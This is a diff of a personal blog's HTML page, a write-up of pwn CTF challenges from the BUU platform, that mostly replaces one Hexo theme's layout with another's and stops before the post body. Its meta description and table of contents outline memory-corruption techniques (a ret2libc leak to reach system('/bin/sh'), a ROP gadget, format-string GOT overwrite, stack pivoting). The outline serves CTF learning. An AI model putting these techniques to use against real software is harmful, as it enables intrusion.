@@ -1,26 +1,24 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
-<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="The Redefine Team">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
-
-<script class="next-config" data-name="main" type="application/json">{"hostname":"li1x.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
-
-    <meta name="description" content="ciscn_2019_n_1-&gt;64位泄露ret2libc1234567891011121314151617181920212223242526272829303132333435363738# 思路：利用ret2libc泄露地址，从而达到system(&quot;bin&#x2F;sh&quot;)# 0x0000000000400c83 : pop rdi ; ret# 0x00000000004">
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://li1x.github.io/ctf/pwn/buu刷题/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="ciscn_2019_n_1-&gt;64位泄露ret2libc1234567891011121314151617181920212223242526272829303132333435363738# 思路：利用ret2libc泄露地址，从而达到system(&quot;bin&#x2F;sh&quot;)# 0x0000000000400c83 : pop rdi ; ret# 0x00000000004">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BUU平台的Pwn题记录">
 <meta property="og:url" content="https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/index.html">
@@ -51,289 +49,543 @@
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/libcsearch.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            BUU平台的Pwn题记录 -
+        
+        Personal Blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
 
 
-<link rel="canonical" href="https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/">
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"li1x.github.io","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":true,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Personal Blog","subtitle":{"text":["Loading"],"hitokoto":{"enable":true,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.4","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"Byself","show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/","path":"CTF/Pwn/BUU刷题/","title":"BUU平台的Pwn题记录"}</script>
+    <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
 
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>BUU平台的Pwn题记录 | Li1x's Blog</title>
-  
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        Personal Blog
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [40,0],
+                translateZ: 0,
+                opacity: [0,1],
+                filter: ['blur(5px)', 'blur(0px)'], // Starting from blurred to unblurred
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i,
+            }).add({
+                targets: '.ml13 .letter',
+                translateY: [0,-40],
+                opacity: [1,0],
+                filter: ['blur(0px)', 'blur(5px)'], // Ending from unblurred to blurred
+                easing: "easeInExpo",
+                duration: 1200,
+                delay: (el, i) => 100 + 30 * i,
+                complete: function() {
+                    hidePreloader(); // Call hidePreloader after the animation completes
+                }
+            });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
 
 
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
 
+    <div class="navbar-content ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Personal Blog
+                
+            </a>
+        </div>
 
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
 
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
 
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
 
-  <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
-  </noscript>
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
-  <div class="headband"></div>
-
-  <main class="main">
-    <div class="column">
-      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
     </div>
-  </div>
 
-  <div class="site-meta">
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
 
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <p class="site-title">Li1x's Blog</p>
-      <i class="logo-line"></i>
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/categories"
+                        >
+                            <span>Categories</span>
+                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
     </a>
-      <p class="site-subtitle" itemprop="description">Lifelong Learning</p>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger" aria-label="Search" role="button">
-        <i class="fa fa-search fa-fw fa-lg"></i>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">11</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
     </div>
-  </div>
-</div>
 
-
-
-<nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section">Home</a></li><li class="menu-item menu-item-tags"><a href="/tags" rel="section">Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories" rel="section">Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives" rel="section">Archives</a></li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
-        </a>
-      </li>
-  </ul>
-</nav>
-
-
-
-  <div class="search-pop-overlay">
-    <div class="popup search-popup"><div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="Searching..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close" role="button">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div class="search-result-container no-result">
-  <div class="search-result-icon">
-    <i class="fa fa-spinner fa-pulse fa-5x"></i>
-  </div>
-</div>
-
-    </div>
-  </div>
+    <div class="window-mask"></div>
 
 </header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">BUU平台的Pwn题记录</h1>
+                </div>
+            
+            </div>
+
         
-  
-  <aside class="sidebar">
-
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
-
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-1"><span class="nav-number">1.</span> <span class="nav-text">ciscn_2019_n_1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#64%E4%BD%8D%E6%B3%84%E9%9C%B2ret2libc"><span class="nav-number">1.0.1.</span> <span class="nav-text">-&gt;64位泄露ret2libc</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop"><span class="nav-number">2.</span> <span class="nav-text">铁人三项(第五赛区)_2018_rop</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#32%E4%BD%8D-ret2libc"><span class="nav-number">2.0.1.</span> <span class="nav-text">-&gt;32位 ret2libc</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-8"><span class="nav-number">3.</span> <span class="nav-text">ciscn_2019_n_8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level2-x64"><span class="nav-number">4.</span> <span class="nav-text">jarvisoj_level2_x64</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%A6%E4%B9%A0%EF%BC%9A32%E4%BD%8D%E5%92%8C64%E4%BD%8D%E4%BC%A0%E5%8F%82%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">4.1.</span> <span class="nav-text">学习：32位和64位传参的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A"><span class="nav-number">4.2.</span> <span class="nav-text">题解：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#not-the-same-3dsctf-2016-%E9%9D%99%E6%80%81-32%E4%BD%8D"><span class="nav-number">5.</span> <span class="nav-text">not_the_same_3dsctf_2016[静态 32位]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="nav-number">6.</span> <span class="nav-text">[第五空间2019 决赛]PWN5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HDCTF-2023-KEEP-ON"><span class="nav-number">7.</span> <span class="nav-text">[HDCTF 2023]KEEP ON</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8A%AB%E6%8C%81%E3%80%81%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-number">7.1.</span> <span class="nav-text">知识点：格式化字符串劫持、栈迁移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%951-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8A%AB%E6%8C%81-%E5%B0%86printf-got-%E6%94%B9%E6%88%90-system-plt"><span class="nav-number">7.2.</span> <span class="nav-text">法1,格式化字符串劫持(将printf_got 改成 system_plt)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%952-%E6%A0%88%E8%BF%81%E7%A7%BB-%E5%8F%AF%E4%BB%A5%E5%85%88%E9%98%85%E8%AF%BB%E5%89%8D%E9%9D%A2%E7%9A%84%E9%82%A3%E4%B8%AA%E6%96%87%E7%AB%A0"><span class="nav-number">7.3.</span> <span class="nav-text">法2,栈迁移,可以先阅读前面的那个文章</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUU-HNCTF-2022-Week1-fmtstrre"><span class="nav-number">8.</span> <span class="nav-text">BUU-[HNCTF 2022 Week1]fmtstrre</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">8.1.</span> <span class="nav-text">exp:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OGeek2019-babyrop"><span class="nav-number">9.</span> <span class="nav-text">[OGeek2019]babyrop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Buu-jarvisoj-fm-fm-n%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E5%86%99%E5%85%A5"><span class="nav-number">10.</span> <span class="nav-text">Buu - jarvisoj_fm[ fm %n任意内存写入]</span></a></li></ol></div>
-        </div>
-        <!--/noindex-->
-
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Li1x"
-      src="/images/avatar.gif">
-  <p class="site-author-name" itemprop="name">Li1x</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives">
-          <span class="site-state-item-count">11</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-          <a href="/categories">
-        <span class="site-state-item-count">4</span>
-        <span class="site-state-item-name">categories</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-          <a href="/tags">
-        <span class="site-state-item-count">6</span>
-        <span class="site-state-item-name">tags</span></a>
-      </div>
-  </nav>
-</div>
-
-        </div>
-      </div>
-    </div>
-
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/redefine-avatar.svg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">The Redefine Team</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-03-26 01:59:06</span>
+        <span class="mobile">2024-03-26 01:59:06</span>
+        <span class="hover-info">Created</span>
+    </span>
     
-  </aside>
-
-
-    </div>
-
-    <div class="main-inner post posts-expand">
-
-
-  
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Li1x">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Li1x's Blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="BUU平台的Pwn题记录 | Li1x's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          BUU平台的Pwn题记录
-        </h1>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2024-03-26 01:59:06" itemprop="dateCreated datePublished" datetime="2024-03-26T01:59:06+08:00">2024-03-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-04-08 00:38:26" itemprop="dateModified" datetime="2024-04-08T00:38:26+08:00">2024-04-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-04-08 00:38:26</span>
+            <span class="mobile">2024-04-08 00:38:26</span>
+            <span class="hover-info">Updated</span>
         </span>
-    </span>
+    
 
-  
-    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
-      <span class="post-meta-item-icon">
-        <i class="far fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">Views: </span>
-      <span id="busuanzi_value_page_pv"></span>
-    </span>
-  
-  <span class="post-meta-item">
     
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/pwn/">pwn</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
     
-    <a title="disqus" href="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="CTF/Pwn/BUU刷题/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="Word count in article">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">Word count in article: </span>
-      <span>10k</span>
-    </span>
-    <span class="post-meta-item" title="Reading time">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>19 mins.</span>
-    </span>
+    
+        <span class="article-tags article-meta-item">
